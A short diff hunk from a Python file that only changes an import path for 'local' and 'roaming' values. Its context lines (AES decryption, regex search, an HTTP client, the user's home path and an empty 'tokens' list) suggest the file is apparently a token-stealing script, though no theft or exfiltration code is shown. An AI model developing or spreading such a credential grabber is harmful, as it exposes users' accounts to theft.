@@ -9,7 +9,7 @@ from Crypto.Cipher import AES
 from typing import Any
 from re import findall
 from requests import get
-from __init__ import local, roaming
+from src.python_package.__init__ import local, roaming
 
 userPath = os.path.expanduser("~")
 tokens = []
